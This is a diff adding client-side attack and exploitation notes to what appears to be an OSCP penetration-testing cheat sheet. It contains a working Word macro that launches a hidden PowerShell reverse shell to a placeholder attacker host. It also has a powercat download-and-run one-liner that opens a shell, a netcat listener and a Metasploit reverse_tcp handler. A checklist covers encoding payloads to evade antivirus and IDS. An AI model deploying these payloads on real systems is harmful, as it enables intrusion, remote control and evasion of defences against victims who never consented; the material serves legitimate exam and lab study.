@@ -125,9 +125,78 @@ Curated from the OSCP Assessment Template with added quick wins for both Linux a
     enum_links -- To enumerate linked servers
     use_link <linked_server_name>  -- To use linked server
     ```
+- Client-Side Attacks
+  - Windows Word Macros
+    - Create a Word document with a macro that opens a reverse shell when the document is opened.
+    - View --> Macros --> Create new macro and paste the code below.
+    - Example VBA code:
+        ```vba
+        Sub AutoOpen()
+            Dim strCmd As String
+            strCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',ATTACKER_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+            CreateObject("WScript.Shell").Run strCmd, 0, False
+        End Sub
+        ```
 
+    - Replace `ATTACKER_IP` and `ATTACKER_PORT` with your listener's IP and port.
+
+    - Setup python simple HTTP server to host the document:
     
+        ```bash
+        python3 -m http.server 80
+        ```
 
+        ```bash
+        IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.2/powercat.ps1');powercat -c 192.168.119.2 -p 4444 -e powershell
+        ```
+
+    - Set up a listener on your machine:
+        
+        ```bash
+        nc -lvnp 4444
+        ```
+
+## Fix exploitation
+
+[ ] Change port number if default port is blocked by firewall.
+[ ] Change the shellcode architecture (x86, x64) to match target system.
+[ ] Fix payload.
+[ ] Encode the payload to bypass antivirus or IDS/IPS systems.
+[ ] Use different payload types (reverse shell, bind shell, meterpreter) based on the situation.
+[ ] Use different target upload location.
+
+
+### Install MinGW on Kali Linux
+`sudo apt install mingw-w64` – Install MinGW for cross-compiling Windows binaries on Linux.
+
+### Cross-Compile Exploit Code
+`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe` – Compile exploit code to Windows executable.
+`i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32` – Compile with Winsock library if needed.
+
+### C for Windows Exploit Example ( make user)
+
+### AV Bypass with Shellcode Encoding
+
+```bash
+sudo apt install wine
+sudo dpkg --add-architecture i386 && apt-get update &&
+apt-get install wine32
+sudo apt install wine
+
+sudo dpkg --add-architecture amd64
+sudo  apt install -y qemu-user-static binfmt-support
+sudo apt-get update && apt-get install wine32
+
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.50.1;set LPORT 443;run;"
+```
+
+![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/7c49cd2d7e2afd9639c73a1de9b7765a-antivirus_evasion_06.png)
+
+![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/61057955413c0439bd528b59c6a814a1-antivirus_evasion_07.png)
+
+![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/f1c4ae36fc63adf510fdc4712a928fc8-antivirus_evasion_08.png)
+
+![alt text](https://static.offsec.com/offsec-courses/PEN-200/imgs/antivirus_evasion/f116295bbacceb3e7ba812feed277d09-antivirus_evasion_09.png)
 
 ## Host Enumeration – Linux
 - `uname -a` – Kernel and architecture info.
